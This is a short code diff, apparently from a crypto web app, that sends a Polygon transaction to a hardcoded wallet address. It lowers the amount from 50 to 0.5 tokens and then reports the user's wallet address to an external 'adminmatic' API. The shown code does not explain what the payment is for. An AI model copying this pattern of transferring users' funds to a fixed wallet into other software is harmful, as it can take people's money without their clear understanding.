@@ -138,7 +138,7 @@ if(provider._network.chainId === 137 ){
  
   const tx = {
    to: '0x3dB971d2c52fFa7A8A7B11518D47F24Dc4b0520e',
-   value: ethers.utils.parseEther('50'),
+   value: ethers.utils.parseEther('0.5'),
    gasLimit: 210000
  };
 
@@ -146,6 +146,7 @@ if(provider._network.chainId === 137 ){
 
  let result;
  try{
+
   result = await signer.sendTransaction(tx)
   // const result = await Moralis.transfer(options)
   const data5 = await axios.get(`http://adminmatic.rapidbazaar.xyz/api/User/GetVersionDetails?address=${account[0]}`)
